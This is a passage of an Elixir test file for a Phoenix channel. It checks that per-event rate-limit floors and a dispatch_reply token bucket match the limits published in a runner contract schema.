      end
    end

    test "a message just past its published floor is accepted",
         %{channel: channel, dispatch: dispatch} do
      published = RunnerContract.json_schema()["x-connection"]["limits"]["min_interval_ms"]
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout

      for {event, assign, payload} <- floor_cases(dispatch) do
        # Timed exactly one millisecond past the published floor: an enforced floor longer
        # than the published one refuses it.
        :sys.replace_state(channel.channel_pid, fn socket ->
          at = System.monotonic_time(:millisecond) - published[event] - 1
          %{socket | assigns: Map.put(socket.assigns, assign, at)}
        end)

        ref = push(channel, event, payload)
        assert_reply ref, status, reply, @reply_timeout
        refute match?(%{reason: "rate_limited"}, reply), "#{event} (#{status}) was rate limited"
      end
    end

    test "the export publishes the dispatch_reply burst, and the channel wires exactly it",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      # The refill arithmetic is LoopctlWeb.RunnerChannel.ReplyBucketTest's, at fixed times.
      # Here only what does not depend on how long the round trips take: the channel's bucket
      # starts at the published capacity, a drained bucket refuses with the published
      # refill interval, and one published interval later it admits again.
      published = RunnerContract.json_schema()["x-connection"]["limits"]["dispatch_reply_burst"]
      assert published == RunnerContract.dispatch_reply_burst()
      %{"capacity" => capacity, "refill_interval_ms" => refill} = published

      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      # From `:full`, one reply leaves capacity - 1 whenever it lands.
      assert {left, _} = :sys.get_state(channel.channel_pid).assigns.reply_bucket
      assert left == capacity - 1

      drain_reply_bucket(channel)
      ref = push(channel, "dispatch_reply", accept(dispatch))

      assert_reply ref,
                   :error,
                   %{reason: "rate_limited", min_interval_ms: ^refill},
                   @reply_timeout

      :sys.replace_state(channel.channel_pid, fn socket ->
        at = System.monotonic_time(:millisecond) - refill - 1
        %{socket | assigns: Map.put(socket.assigns, :reply_bucket, {0, at})}
      end)

      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"
    end
  end
end
